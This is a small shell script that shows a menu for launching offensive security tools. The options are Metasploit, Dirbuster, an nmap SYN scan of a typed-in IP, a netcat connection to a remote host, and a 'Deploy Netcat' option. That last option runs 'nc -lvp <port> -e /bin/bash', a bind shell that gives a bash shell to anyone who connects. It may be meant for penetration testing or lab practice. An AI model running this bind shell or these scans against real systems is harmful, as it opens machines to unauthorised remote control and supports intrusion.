#!/bin/sh
set -Cefu

show_menu() {
	printf '%b' "$green"
	cat <<- EOF
		         ^          $exe_name
		        / \\
		       //V\\\        Version: $version
		      / \|/ \        System: $os
		     / / v \ \         Host: $host
		    /         \\        Arch: $arch
		   /           \\
		  /             \    Options
		 /   /|     |\   \     0x01. Metasploit
		/   / \     / \   \    0x02. Dirbuster
		\  /   X   X   \  /    0x03. Nmap
		 \/   / \ / \   \/     0x04. Deploy Netcat
		     /   V   \         0x05. Connect Netcat
		    |         |        0x06. Exit
	EOF

	printf "\n${green}%s${reset} %s [${green}%s${reset}] %s" \
		"==>" "Select option" "1-6" ": "
	printf '%b' "$reset"
}

close() {
	printf '%s==>\n' "[!] Exiting...\n" && clear

	exit 1
} >&2

invalid_opt() {
	printf '%b\n' "${red}error${reset}: Invalid option. Select one from [1-6]"
} >&2

run_nmap() {
	printf '==> %s' 'Specify nmap IP address: '
	read -r ip

	sudo nmap -sS -Pn -n -T3 "$ip"
}

deploy_netcat() {
	printf '==> %s' 'Specify netcat port: '
	read -r port

	nc -lvp "$port" -e /bin/bash
	read -r _
}

connect_netcat() {
	printf '==> %s' 'Specify netcat port: '
	read -r port

	printf '==> %s' 'Specify netcat IP: '
	read -r ip

	nc "$ip" "$port"
	read -r _
}

main() {
	trap close INT EXIT QUIT TERM

	exe_name="${0##*/}"
	 version=0.1.0
	    info=$(uname -mns)
	    tail="${info#* }"
	      os="${info%% *}"
	    host="${tail% *}"
	    arch="${info##* }"
	   reset='\033[0m'
	     red='\033[1m'
	   green='\033[32m'

	while true
	do
		show_menu

		read -r opt

		case $opt in
		1) msfconsole     ;;
		2) dirbuster      ;;
		3) run_nmap       ;;
		4) deploy_netcat  ;;
		5) connect_netcat ;;
		6) close          ;;
		*) invalid_opt    ;;
		esac

		clear
	done
}

main "$@"
